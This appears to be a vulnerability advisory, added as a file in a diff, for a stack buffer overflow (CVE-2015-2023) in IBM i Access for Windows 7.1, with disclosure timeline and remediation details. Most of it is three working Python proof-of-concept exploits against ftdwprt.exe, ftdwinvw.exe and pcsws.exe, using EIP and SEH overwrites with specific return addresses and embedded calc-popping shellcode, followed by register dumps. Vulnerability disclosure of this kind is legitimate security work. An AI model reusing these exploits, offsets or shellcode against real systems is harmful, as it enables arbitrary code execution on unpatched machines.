@@ -1,0 +1,233 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/IBMI-CLIENT-ACCESS-BUFFER-OVERFLOW.txt
+
+
+Vendor:
+==============
+www.ibm.com
+
+
+Product:
+====================================================
+IBM i Access for Windows
+Release 7.1 of IBM i Access for Windows is affected
+
+
+Vulnerability Type:
+=======================
+Stack Buffer Overflow
+Arbitrary Code Exec
+
+
+CVE Reference:
+==============
+CVE-2015-2023
+
+
+Vulnerability Details:
+=====================
+IBM i Access for Windows is vulnerable to a buffer overflow. A local
+attacker could overflow a buffer and execute arbitrary code on the Windows PC.
+
+client Access has ability to receive remote commands via "Cwbrxd.exe"
+service
+Ref: http://www-01.ibm.com/support/docview.wss?uid=nas8N1019253
+
+"Incoming remote command was designed for running non-interactive commands
+and programs on a PC", therefore a remote attacker could execute arbitrary code on the system.
+
+Remediation/Fixes
+The issue can be fixed by obtaining and applying the Service Pack SI57907.
+
+The buffer overflow vulnerability can be remediated by applying Service
+Pack SI57907.
+
+The Service Pack is available at:
+http://www-03.ibm.com/systems/power/software/i/access/windows_sp.html
+
+Workarounds and Mitigations
+None known
+
+CVSS Base Score: 4.4
+CVSS Temporal Score: See http://xforce.iss.net/xforce/xfdb/104044 for the
+current score
+CVSS Environmental Score*: Undefined
+CVSS Vector: (AV:L/AC:M/Au:N/C:P/I:P/A:P)
+
+
+Exploit code(s):
+==============================================================================
+
+Three python POC scriptz follow that exploitz various component of IBM i
+Access.
+
+
+1) Exploits "ftdwprt.exe", direct EIP overwrite
+
+import struct,os,subprocess
+
+pgm="C:\\Program Files (x86)\\IBM\\Client Access\\AFPViewr\\ftdwprt.exe  "
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+
+# use jmp or call esp in FTDBT.dll under AFPviewer for Client Access
+# we find ---> 0x638091df : jmp esp |  {PAGE_EXECUTE_READ} [FTDBDT.dll]
+ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.05.04.00
+(C:\Program Files (x86)\IBM\Client Access\AFPViewr\FTDBDT.dll)
+
+rp=struct.pack('<L', 0x638091FB)
+payload="A" * 1043+rp+sc+"\x90"*20
+subprocess.Popen([pgm, payload], shell=False) #<----1043 bytes outside of
+debugger use 1044 in debugger.
+
+
+==================================
+
+
+2) Exploits "ftdwinvw.exe", direct EIP overwrite
+
+import struct,os,subprocess
+
+pgm="C:\\Program Files (x86)\\IBM\\Client Access\\AFPViewr\\ftdwinvw.exe "
+
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+
+#payload="A"*1044+"RRRR"+"\x90"*10+"B"*100 #Test EIP
+
+rp=struct.pack('<L', 0x638091fb) #CALL ESP (0x638091fb) FTDBDT.dll
+payload="A"*1044+rp+"\x90"*10+sc #KABOOM!!!
+subprocess.Popen([pgm, payload], shell=False)
+
+registers dump...
+
+EAX 0000040B
+ECX 0044AAB8 ASCII "AAAAAAAAA...
+EDX 7F17E09F
+EBX 00000000
+ESP 0018E5B8
+EBP 41414141
+ESI 005A9FB9 ASCII "AAAAAAAAA...
+EDI 0044E94C ftdwinvw.0044E94C
+EIP 52525252                    <----------BOOM!
+
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 0  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 0  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
+ST0 empty g
+ST1 empty g
+ST2 empty g
+ST3 empty g
+ST4 empty g
+ST5 empty g
+ST6 empty g
+ST7 empty g
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+
+3) Exploits "PCSWS.exe", structured exeception handler (SEH) overwrite
+
+pgm="C:\\Program Files (x86)\\IBM\\Client Access\\Emulator\\pcsws.exe "
+
+
+#ctrl EIP at 1340 bytes, ESP points to RETURN to ntdll.770BB499 so we will
+jump 8 bytes to our SC
+#as ESP points to our SC 8 bytes after!
+
+jmp="\xEB\x06"+"\x90"*2
+#payload="A"*1336+"BBBB" #Test
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+
+rp=struct.pack('<L', 0x678c1e49)                 #pop pop ret 0x67952486
+PCSW32X.dll
+payload="A"*1332+jmp+rp+sc+"\x90"*10             #KABOOOOOOOOOOOOOOOOOOM!
+subprocess.Popen([pgm, payload], shell=False)
+
+register dump...
+
+0018FF6C   41414141  AAAA
+0018FF70   41414141  AAAA
+0018FF74   41414141  AAAA
+0018FF78   41414141  AAAA  Pointer to next SEH record
+0018FF7C   42424242  BBBB  SE handler
+0018FF80   004C0400  .L.  pcsws.004C0400
+
+
+Disclosure Timeline:
+====================================
+Vendor Notification:  May 21, 2015
+November 18, 2015  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Local / Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+=================================================================================
+Request Method(s):          [+] local or remote commands via "Cwbrxd.exe"
+service
+
+
+Vulnerable Product:         [+] IBM i Access for Windows Release 7.1
+
+
+Affected Area(s):           [+] OS
+
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
